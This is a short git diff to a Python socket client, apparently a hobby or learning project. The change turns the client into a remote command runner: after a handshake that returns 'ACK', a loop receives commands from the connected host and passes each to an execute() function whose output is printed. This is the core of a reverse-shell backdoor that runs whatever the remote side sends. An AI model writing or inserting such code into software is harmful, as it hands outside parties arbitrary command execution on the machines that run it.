@@ -18,17 +18,26 @@ def execute(cmd):
     return output.decode()
 
 #Creating a socket
-client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 
 #Connect the client
-client.connect((target_host,target_port))
+server.connect((target_host,target_port))
 
-#Send some data
-client.send(b"Handshake Initialised from " + bytes(name,'utf-8'))
+def Handshake():
+    #Send some data
+    server.send(b"Handshake Initialised from " + bytes(name,'utf-8'))
 
-#Receive data
-response = client.recv(4096)
-print(response.decode())
+    #Receive data
+    response = server.recv(4096)
+    print(response.decode())
+    return response.decode()
 
-
-x = input(":")
+if __name__ == '__main__':
+    response = ''
+    ack = Handshake()
+    if ack == 'ACK':
+        while response != 'terminate':
+            response = server.recv(4096)
+            if response:
+                print(execute(response))
+    x = input(":")
